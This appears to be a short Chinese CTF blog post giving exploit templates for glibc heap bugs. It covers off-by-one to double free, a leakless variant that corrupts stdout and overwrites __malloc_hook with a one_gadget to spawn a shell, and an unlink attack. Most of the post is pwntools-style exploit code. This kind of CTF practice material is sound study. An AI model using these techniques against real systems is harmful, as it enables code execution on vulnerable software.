---
title: 'OFF-BY-ONE:TYPICAL'
date: 2019-08-13 18:24:01
tags: heap
---
OFF BY ON 各类典型利用， 本篇非常水...为了恢复一下做题的手感。
<!--more-->
# Leak + Off By One
主要利用方式是:
* OFF BY ONE -> double free
```python
add(0x400)#0
add(0x88)#1
add(0x88)#2
free(0)
add(0x18)#0
edit(0,'A'*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)
add(0x88)
show(4)
#get leak
add(0x78)
free(4)
free(3)
#double free
```
# No Leak + Off By One
* off by one 
* free chunk 4 into fastbin
* malloc 0x80 之后 free 为了留下libc地址
* malloc 0x200 Overlap partial write
* modify stdout to leak
* free chunk 4 into fastbin 
* edit to write fd 
* modify __malloc_hook
* double free to get_shell
```python
add(0x400)
add(0x88)
add(0x88)
free(0)
add(0x18)
edit(0,'\x00'*0x18)
add(0x88)
add(0x68)
free(3)
free(1)
add(0x1f8)#1
free(4)
add(0x88)#3
free(3)
add(0x200)#3
edit(3,'\x00'*0x88+p64(0x71)+'\xdd\x25\n')
add(0x68)#4
add(0x68)#5
edit(5,'\x00'*0x33+p64(0x1800)+'\x00'*0x19+'\n')
p.read(0x40)
base=u64(p.read(0x8))-(0x7ffff7dd2600-0x7ffff7a0d000)
log.warning(hex(base))
free(4)
libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
libc.address=base
one=base+0xf02a4
edit(3,'\x00'*0x88+p64(0x71)+p64(libc.sym['__malloc_hook']-35)+'\n')
add(0x68)#4
add(0x68)#6
free(3)
add(0x88)
add(0x18)
edit(6,'\x00'*19+p64(one)+'\n')
free(7)
free(4)
```

# unlink
主要就是伪造堆块 前提是有edit功能和已知&ptr(没有pie或者泄漏了程序装载基址)
```python
add(0x100)#0
add(0xf8)#1
p.readuntil("ss ")
pie=int(p.readline(),16)
log.warning(hex(pie))
add(0x1f8)#2
add(0x100)#3
pay=flat(1,0xf1,pie-0x18,pie-0x10)+'\x00'*0xd0+p64(0xf0)
edit(1,(pay))
free(2)
```


